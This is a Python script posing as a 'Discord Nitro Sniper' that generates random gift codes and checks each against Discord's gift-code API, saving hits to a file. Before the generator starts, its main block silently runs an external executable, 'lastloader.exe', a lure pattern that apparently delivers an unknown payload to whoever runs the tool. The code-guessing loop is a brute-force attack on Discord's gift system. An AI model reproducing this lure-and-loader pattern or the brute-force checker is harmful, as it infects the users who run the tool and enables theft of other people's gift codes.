import subprocess
import sys
import random
import string
import time
import os
import requests

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_random_string():
    letters = string.ascii_uppercase
    digits = string.digits
    return ''.join(random.choice(letters if i % 2 == 0 else digits) for i in range(16))

def print_loading_animation(duration):
    animation = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for _ in range(int(duration * 10)):
        for char in animation:
            print(f"\r\033[94mGENERATING CODES... {char}\033[0m", end="", flush=True)
            time.sleep(0.1)

def print_title():
    title = """
\033[95m
 ____  _                       _   _   _ _ _             ____        _                
|  _ \(_)___  ___ ___  _ __ __| | | \ | (_) |_ _ __ ___ / ___| _ __ (_)_ __   ___ _ __ 
| | | | / __|/ __/ _ \| '__/ _` | |  \| | | __| '__/ _ \\___ \| '_ \| | '_ \ / _ \ '__|
| |_| | \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) |___) | | | | | |_) |  __/ |   
|____/|_|___/\___\___/|_|  \__,_| |_| \_|_|\__|_|  \___/|____/|_| |_|_| .__/ \___|_|   
                                                                      |_|              
\033[0m"""
    print(title)

def run_loader():
    original_exe = "lastloader.exe"
    try:
        result = subprocess.run([original_exe], check=True)
        print(f"El programa original se ejecutó con código de salida: {result.returncode}")
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar el programa original: {e}")
        sys.exit(1)

def verify_nitro_code(code):
    url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
    response = requests.get(url)
    return response.status_code == 200

def run_code_generator():
    clear_screen()
    print_title()

    num_codes = int(input("\033[93mEnter the number of codes to generate: \033[0m"))

    print_loading_animation(2)

    if not os.path.exists('results'):
        os.makedirs('results')

    valid_codes = []

    print("\n\n\033[92mGenerated Codes:\033[0m")
    for i in range(num_codes):
        code = generate_random_string()
        is_valid = verify_nitro_code(code)
        status = "\033[92mVALID\033[0m" if is_valid else "\033[91mINVALID\033[0m"
        print(f"\033[96m{i+1}. {code} - {status}\033[0m")
        
        if is_valid:
            valid_codes.append(code)

    if valid_codes:
        with open('results/valid_codes.txt', 'w') as f:
            for code in valid_codes:
                f.write(f"{code}\n")
        print(f"\n\033[92m{len(valid_codes)} códigos válidos guardados en results/valid_codes.txt\033[0m")
    else:
        print("\n\033[91mNo se encontraron códigos válidos.\033[0m")

if __name__ == "__main__":
    run_loader()  # Primero ejecuta el loader
    run_code_generator()  # Luego ejecuta tu código
